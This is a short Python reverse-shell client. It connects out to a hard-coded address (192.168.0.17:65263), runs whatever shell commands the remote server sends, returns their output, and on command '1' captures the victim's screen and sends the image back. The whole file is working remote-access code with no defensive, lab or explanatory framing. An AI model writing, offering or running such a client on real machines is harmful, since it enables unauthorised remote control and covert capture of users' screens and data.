import socket
import subprocess
import pyscreenshot as ImageGrab  

class Client:
    def __init__(self, server_ip, port):
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        self.socket.connect((self.server_ip, self.port))
        msg = self.socket.recv(1024).decode()
        print('[*] server:', msg)
        
  
    def start(self):
        while True:
            cmd = self.socket.recv(1024).decode()
            print("Cmd in bug is "+cmd)
            print(f'[+] received command: {cmd}')
            if cmd == '1':
                screenshot = ImageGrab.grab()
                screenshot_path = "screenshot.png"
                screenshot.save(screenshot_path)
                with open(screenshot_path, "rb") as f:
                    screenshot_data = f.read()
                print("Check")
                self.socket.send(screenshot_data)
                break
                
            if cmd.lower() in ['q', 'quit', 'x', 'exit']:
                break

            result = self.execute_command(cmd)
            self.socket.send(result)
        self.socket.close()

    def execute_command(self, cmd):
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed'.encode()

        return result

if __name__ == "__main__":
    SERVER = "192.168.0.17"
    PORT = 65263
    client = Client(SERVER, PORT)
    client.connect()
    client.start()
